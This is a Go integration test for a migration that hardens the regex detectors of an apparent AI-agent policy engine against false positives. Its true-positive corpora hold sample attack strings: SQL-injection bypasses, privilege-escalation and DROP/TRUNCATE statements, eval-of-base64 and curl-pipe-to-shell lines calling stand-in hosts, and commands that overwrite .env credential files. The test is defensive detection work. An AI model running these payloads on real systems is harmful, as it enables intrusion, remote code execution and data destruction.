// Copyright 2026 AxonFlow
// SPDX-License-Identifier: BUSL-1.1

package agent

import (
	"database/sql"
	"os"
	"regexp"
	"strings"
	"testing"
)

// TestMigration135_DetectorFPHardening_RealPostgres proves migration 135
// against a REAL Postgres with the full core migration chain applied: the
// hardened detector patterns no longer match the design partner's verbatim
// documentation-only triggers (epic #2800, #2802) while still matching a real
// attack corpus. It also proves the down/up round-trip, idempotency, the
// customized-row guard, and unchanged enforcement fields.
//
// TWO layers of assertion (the round-2 methodology fix):
//  1. Per-detector — each corpus string is proven against the ORIGINAL seed
//     (a real reproduction), then FP-not-matched / TP-matched by the detector's
//     OWN live pattern.
//  2. FULL-CLASS — every FP string is run through EVERY enabled security-sqli
//     and security-dangerous pattern (what the real check-input evaluator
//     does), asserting NO enabled policy matches it. This is what surfaces a
//     loose sibling (e.g. sys_sqli_grant's bare \bGRANT\s+ matching "Grant
//     viewer OR editor" inside admin_bypass's own FP corpus). Every TP string
//     must be matched by SOME enabled policy in its class.
//
// Patterns are read straight out of static_policies (the live, migration-seeded
// source of truth) and compiled with Go's RE2 engine — the same engine the
// shared policy evaluator uses.
func TestMigration135_DetectorFPHardening_RealPostgres(t *testing.T) {
	if os.Getenv("TEST_PG_INTEGRATION") != "1" {
		t.Skip("TEST_PG_INTEGRATION=1 not set — skipping real-Postgres migration-135 test")
	}

	dsn, cleanup := startCountTestPostgres(t)
	t.Cleanup(cleanup)

	db, err := sql.Open("postgres", dsn)
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })
	db.SetMaxOpenConns(1)

	for _, kv := range []struct{ key, val string }{
		{"app.db_password", "testpass"},
		{"app.deployment_org_id", "local-dev-org"},
		{"app.deployment_kind", "dev"},
		{"app.current_org_id", "local-dev-org"},
	} {
		if _, err := db.Exec("SELECT set_config($1, $2, false)", kv.key, kv.val); err != nil {
			t.Fatalf("set_config %s: %v", kv.key, err)
		}
	}

	applyAllCoreMigrations(t, db, "../../migrations/core")

	type detectorCase struct {
		policyID   string
		oldPattern string // the pre-135 seeded pattern (031/059 verbatim)
		fps        []string
		tps        []string
	}
	cases := []detectorCase{
		{
			policyID:   "sys_sqli_admin_bypass",
			oldPattern: `(?i)['"]?\s*OR\s+['"]?[^'"]*['"]?\s*=\s*['"]?[^'"]*['"]?\s*--`,
			fps: []string{
				"## Rollout Plan\n\n| Component | Status |\n|---|---|\n| admin console | pending |\n\nGrant viewer OR editor = acceptable for this phase.\n\n---\n\nNext steps below.",
				"Set the flag to A OR B = C in the admin console\n---\nfooter",
				"| Option | Meaning |\n|---|---|\nUse admin console OR settings page = same effect --- see docs",
			},
			tps: []string{
				`' OR 1=1 --`, `admin' OR '1'='1' --`, `admin' OR 1=1--`, `1 OR 1=1 --`,
				`" OR ""="" --`, `{"query":"admin' OR 1=1 --"}`,
			},
		},
		{
			policyID:   "sys_sqli_revoke",
			oldPattern: `(?i)\bREVOKE\s+`,
			fps: []string{
				"I will revoke immediately after the single edit call.",
				"We should revoke access from all contractors next week.",
				"Please revoke the API token once the migration completes.",
				"The admin can revoke all permissions on Friday from the dashboard settings page going forward.",
			},
			tps: []string{
				`REVOKE ALL ON db FROM user;`,
				`REVOKE ALL PRIVILEGES ON *.* FROM 'attacker'@'%';`,
				`revoke select, insert ON app.orders FROM analyst;`,
				`REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'u'@'h';`,
				`REVOKE GRANT OPTION FOR SELECT ON t FROM PUBLIC;`,
				`REVOKE EXECUTE ON FUNCTION pg_read_file(text) FROM app_role;`,
				`REVOKE SELECT ON orders FROM analyst`,
				`REVOKE ALL PRIVILEGES ON *.* FROM attacker`,
				"REVOKE ALL\n ON db\n FROM user;",
				`REVOKE ALL ON db FROM GROUP dev;`,
				"REVOKE SELECT ON t FROM analyst\nSELECT 1",
				`REVOKE SELECT ON t FROM public CASCADE;`, // R3 r2 L2: CASCADE grantee
			},
		},
		{
			policyID:   "sys_sqli_grant",
			oldPattern: `(?i)\bGRANT\s+`,
			fps: []string{
				// Partner finding: "Grant viewer OR editor" is English, not a GRANT statement.
				"You can grant viewer OR editor access from the admin console.",
				"grant access to the reporting dashboard for analysts",
				"the grant process requires manager approval",
				"We should grant access to Bob;", // R3 r2 F1: English "grant X to Y;" is not a GRANT statement
				"please grant read to alice, bob;",
			},
			tps: []string{
				`GRANT SELECT ON foo TO bar`, // count-test invariant
				`grant insert on baz to qux`,
				`GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';`,
				`GRANT SELECT ON t TO analyst WITH GRANT OPTION;`,
				`GRANT ALL ON db TO bob--`,
			},
		},
		{
			policyID:   "sys_sqli_drop_table",
			oldPattern: `(?i)\bDROP\s+TABLE\b`,
			fps: []string{
				"the drop table statement removes a table and its rows",
				"drop table constraints can be tricky to reason about",
				"Drop Table Procedure\n\nThe drop table workflow is described here.", // R3 r2: heading not a statement
			},
			tps: []string{
				`DROP TABLE users;`, `drop table if exists logs;`,
				"DROP TABLE `db`.`t`;", `DROP TABLE orders CASCADE;`,
				`1; DROP TABLE users; --`, `admin'; DROP TABLE users--`,
				`DROP TABLE [dbo].[t];`,     // R3 r1 H1: MSSQL bracket identifiers
				`DROP TABLE /* x */ users;`, // R3 r1 L1: comment between verb and object
			},
		},
		{
			policyID:   "sys_sqli_drop_database",
			oldPattern: `(?i)\bDROP\s+DATABASE\b`,
			fps: []string{
				"you may drop database backups regularly to save space",
				"the drop database command is irreversible",
			},
			tps: []string{`DROP DATABASE prod;`, `drop database if exists staging;`, `DROP DATABASE prod--`, `DROP DATABASE [mydb];`},
		},
		{
			policyID:   "sys_sqli_truncate",
			oldPattern: `(?i)\bTRUNCATE\s+TABLE\b`,
			fps: []string{
				"we truncate table logs weekly during the maintenance window",
				"the truncate table operation resets identity columns",
			},
			tps: []string{`TRUNCATE TABLE logs;`, `truncate table sessions cascade;`, `TRUNCATE TABLE audit--`, `TRUNCATE TABLE [dbo].[t];`},
		},
		{
			policyID:   "sys_sqli_alter_table",
			oldPattern: `(?i)\bALTER\s+TABLE\b`,
			fps: []string{
				"alter table structure is complex; plan the migration carefully",
				"the alter table statement changes schema",
			},
			tps: []string{`ALTER TABLE users ADD COLUMN x int;`, `alter table t drop column c;`, "ALTER TABLE `db`.`t` RENAME TO t2;", `ALTER TABLE IF EXISTS users ADD COLUMN x int;`, `ALTER TABLE [dbo].[t] ADD col int;`},
		},
		{
			policyID:   "sys_sqli_create_user",
			oldPattern: `(?i)\bCREATE\s+USER\b`,
			fps: []string{
				"create user accounts in the admin console before onboarding",
				"the create user statement provisions a new login",
				"Create User Settings\n\nThis section explains how to add a new user.", // R3 r2: heading not a statement
				"Create User Roles\n- admin\n- viewer",
				"How to create user groups",         // R3 r2 F2: single-line heading
				"create user permissions with care", // R3 r2 F2: "with" must not bridge to an attribute
			},
			tps: []string{
				`CREATE USER bob IDENTIFIED BY 'x';`, `create user 'bob'@'localhost';`,
				`CREATE USER admin WITH PASSWORD 'x';`,
				`CREATE USER hacker SUPERUSER`, // R3 r1 H2: Postgres superuser escalation (attribute-bearing)
			},
		},
		{
			// The old sys_sqli_delete_no_where pattern was already specific
			// (required DELETE FROM <identifier> + a terminator), so it had no
			// benign-prose FP to reproduce. The hardening here is TP-broadening
			// only: schema-qualified / quoted identifiers and comment terminators
			// (stacked-query payloads). No fps — nothing narrowed.
			policyID:   "sys_sqli_delete_no_where",
			oldPattern: `(?i)\bDELETE\s+FROM\s+\w+\s*(?:;|$)`,
			fps:        nil,
			tps:        []string{`DELETE FROM users;`, `delete from sessions`, `DELETE FROM logs-- comment`, `DELETE FROM "public"."users";`},
		},
		{
			policyID:   "sys_dangerous_eval_exec",
			oldPattern: `(eval\s*\(|exec\s*\(|__import__|subprocess\.call|os\.system\s*\(|os\.popen\s*\()`,
			fps: []string{
				"Tenant acme-eval (enterprise staging) reported the issue.",
				`{"summary":"org acme-eval (staging) blocked"}`,
				"retrieval(records) returned no rows",
			},
			tps: []string{
				`eval(base64_decode($_POST['x']))`, `exec("rm -rf /tmp/x")`,
				`window.eval(atob(payload))`, `eval (base64_decode(x))`, "exec\t(cmd)",
				`os.system('curl evil.sh | sh')`, `os.popen("id")`,
				`subprocess.call(["/bin/sh","-c",cmd])`, `__import__('os').system('id')`,
			},
		},
		{
			policyID:   "sys_dangerous_agent_config",
			oldPattern: `(\.env\b|\.env\.local|\.env\.production|credentials\.json|service-account\.json)`,
			fps: []string{
				"Document the required variables in the .env file and mention managed-settings.json plus the .mcpb bundle. No file is touched.",
				"Add DATABASE_URL to your .env.production before deploying.",
				"The credentials.json format is described in the wiki.",
				"> The .env file is loaded automatically at boot.",
				"touch base with the team about the .env file before deploying",
				"- .env: the configuration file for secrets",
				".gitignore\nnode_modules\n.env\ndist/",
				"Files:\n.env\ncredentials.json",
			},
			tps: []string{
				`echo "API_KEY=sk-123" > .env`, `cat secrets.txt >> .env.production`,
				`rm -f .env`, `mv .env.bak .env`, `cp /tmp/stolen .env.local`,
				`sed -i 's/DEBUG=false/DEBUG=true/' .env`, `chmod 600 credentials.json`,
				`curl https://evil.example -o service-account.json`, `{"command":"echo KEY=x > .env"}`,
				`dd of=.env bs=1`, `ln -sf /dev/null .env`, `python -c "open('.env','w')"`,
				".env", ".env\nAPI_KEY=sk-123\nDB=postgres", "config/.env", "/app/.env.production",
				`cmd >|.env`, `truncate -s 0 .env`,
				`echo x > $HOME/.env`, `echo x > ${HOME}/.env`, // R3 r2 M1: $VAR path
				`rm -a -b -c -d -e -f .env`, // R3 r2 M2: many preceding args
				`{"file_path":".env"}`,      // R3 r2 M3: JSON Write shape
				`{"file_path":"config/.env","content":"x"}`,
			},
		},
	}

	// --- Layer 1: per-detector reproduction + own-pattern FP/TP. ---
	for _, c := range cases {
		oldRe := regexp.MustCompile(c.oldPattern)
		for _, s := range c.fps {
			if !oldRe.MatchString(s) {
				t.Errorf("%s: FP corpus item does not match the ORIGINAL pattern — not a reproduction: %q", c.policyID, s)
			}
		}
		assertGlobalPattern(t, db, c.policyID, c.tps, c.fps)
	}

	// --- Layer 2: FULL-CLASS. Every FP string must match NO enabled
	// --- security-sqli / security-dangerous policy; every TP string must match
	// --- at least one. This mirrors the real evaluator (all enabled rows) and
	// --- catches sibling collisions the per-detector layer cannot. ---
	// Include security-admin: the real request-phase evaluator (GetEffective) has
	// no category filter, and security-admin carries the LOOSEST patterns
	// (\busers\b, config_|admin_|system_) — omitting it would reopen the exact
	// sibling-collision blind spot this full-class check exists to close (R3 r1 M3).
	classPatterns := loadEnabledClassPatterns(t, db, "security-sqli", "security-dangerous", "security-admin")
	for _, c := range cases {
		for _, s := range c.fps {
			if hit := firstClassMatch(classPatterns, s); hit != "" {
				t.Errorf("FULL-CLASS FP: %q (from %s corpus) is blocked by enabled policy %q — harden that sibling too", s, c.policyID, hit)
			}
		}
		for _, s := range c.tps {
			if firstClassMatch(classPatterns, s) == "" {
				t.Errorf("FULL-CLASS TP: %q (from %s corpus) is matched by NO enabled security-sqli/dangerous policy — detection weakened", s, c.policyID)
			}
		}
	}

	// --- Only the pattern changed: action/severity/enabled untouched (spot-check). ---
	for policyID, want := range map[string]struct{ severity, action string }{
		"sys_sqli_admin_bypass":      {"critical", "warn"},
		"sys_sqli_revoke":            {"critical", "warn"},
		"sys_sqli_grant":             {"critical", "warn"},
		"sys_dangerous_eval_exec":    {"high", "block"},
		"sys_dangerous_agent_config": {"high", "block"},
	} {
		var severity, action string
		var enabled bool
		if err := db.QueryRow(
			`SELECT severity, action, enabled FROM static_policies WHERE policy_id = $1 AND tenant_id = 'global'`,
			policyID).Scan(&severity, &action, &enabled); err != nil {
			t.Fatalf("read %s row: %v", policyID, err)
		}
		if severity != want.severity || action != want.action || !enabled {
			t.Errorf("%s: severity/action/enabled = %s/%s/%v, want %s/%s/true (migration 135 must not change enforcement fields)",
				policyID, severity, action, enabled, want.severity, want.action)
		}
	}

	// --- Down migration restores the original seeded patterns. ---
	downSQL, err := os.ReadFile("../../migrations/core/135_detector_fp_syntactic_context_down.sql")
	if err != nil {
		t.Fatalf("read down migration: %v", err)
	}
	if _, err := db.Exec(string(downSQL)); err != nil {
		t.Fatalf("apply down migration: %v", err)
	}
	for _, c := range cases {
		if got := readGlobalPattern(t, db, c.policyID); got != c.oldPattern {
			t.Errorf("%s: down migration did not restore the original pattern\n got: %s\nwant: %s", c.policyID, got, c.oldPattern)
		}
	}

	// --- Re-applying up re-hardens; a second up is a no-op (idempotent). ---
	upSQL, err := os.ReadFile("../../migrations/core/135_detector_fp_syntactic_context.sql")
	if err != nil {
		t.Fatalf("read up migration: %v", err)
	}
	for i := 0; i < 2; i++ {
		if _, err := db.Exec(string(upSQL)); err != nil {
			t.Fatalf("apply up migration (run %d): %v", i+1, err)
		}
	}
	for _, c := range cases {
		if got := readGlobalPattern(t, db, c.policyID); got == c.oldPattern {
			t.Errorf("%s: up migration did not re-harden the pattern after down", c.policyID)
		}
	}

	// --- The original-pattern guard: a tenant-customized row is left alone. ---
	if _, err := db.Exec(string(downSQL)); err != nil {
		t.Fatalf("apply down before customization: %v", err)
	}
	const customized = `(customer-edited-pattern)`
	if _, err := db.Exec(
		`UPDATE static_policies SET pattern = $1 WHERE policy_id = 'sys_dangerous_agent_config' AND tenant_id = 'global'`,
		customized); err != nil {
		t.Fatalf("customize row: %v", err)
	}
	if _, err := db.Exec(string(upSQL)); err != nil {
		t.Fatalf("apply up over customized row: %v", err)
	}
	if got := readGlobalPattern(t, db, "sys_dangerous_agent_config"); got != customized {
		t.Errorf("customized sys_dangerous_agent_config pattern was clobbered: got %s, want %s", got, customized)
	}
}

// readGlobalPattern returns the pattern column for a global-tenant policy row.
func readGlobalPattern(t *testing.T, db *sql.DB, policyID string) string {
	t.Helper()
	var pattern string
	if err := db.QueryRow(
		`SELECT pattern FROM static_policies WHERE policy_id = $1 AND tenant_id = 'global'`, policyID,
	).Scan(&pattern); err != nil {
		t.Fatalf("read pattern %q: %v", policyID, err)
	}
	return pattern
}

// assertGlobalPattern is assertSeededPattern without the tier='system' scope:
// two of the migration-135 rows (the migration-059 dangerous-command set) are
// tenant-tier starter policies, so they are read by policy_id + global tenant.
func assertGlobalPattern(t *testing.T, db *sql.DB, policyID string, mustMatch, mustNotMatch []string) {
	t.Helper()
	pattern := readGlobalPattern(t, db, policyID)
	re, err := regexp.Compile(pattern)
	if err != nil {
		t.Fatalf("seeded pattern %q failed to compile: %v\npattern: %s", policyID, err, pattern)
	}
	for _, s := range mustMatch {
		if !re.MatchString(s) {
			t.Errorf("seeded %q should MATCH (true-positive weakened) %q (pattern %q)", policyID, s, pattern)
		}
	}
	for _, s := range mustNotMatch {
		if re.MatchString(s) {
			t.Errorf("seeded %q should NOT match (false positive) %q (pattern %q)", policyID, s, pattern)
		}
	}
}

type classPattern struct {
	policyID string
	re       *regexp.Regexp
}

// loadEnabledClassPatterns compiles every enabled static_policies pattern in the
// given categories (the set the real evaluator would run at request phase).
func loadEnabledClassPatterns(t *testing.T, db *sql.DB, categories ...string) []classPattern {
	t.Helper()
	rows, err := db.Query(
		`SELECT policy_id, pattern FROM static_policies
		 WHERE enabled = true AND category = ANY(string_to_array($1, ','))`,
		strings.Join(categories, ","))
	if err != nil {
		t.Fatalf("load class patterns: %v", err)
	}
	defer rows.Close()
	var out []classPattern
	for rows.Next() {
		var id, pat string
		if err := rows.Scan(&id, &pat); err != nil {
			t.Fatalf("scan class pattern: %v", err)
		}
		re, err := regexp.Compile(pat)
		if err != nil {
			t.Fatalf("enabled policy %q pattern failed to compile: %v\npattern: %s", id, err, pat)
		}
		out = append(out, classPattern{policyID: id, re: re})
	}
	if len(out) == 0 {
		t.Fatalf("no enabled patterns loaded for categories %v", categories)
	}
	return out
}

// firstClassMatch returns the policy_id of the first pattern that matches s, or "".
func firstClassMatch(pats []classPattern, s string) string {
	for _, p := range pats {
		if p.re.MatchString(s) {
			return p.policyID
		}
	}
	return ""
}
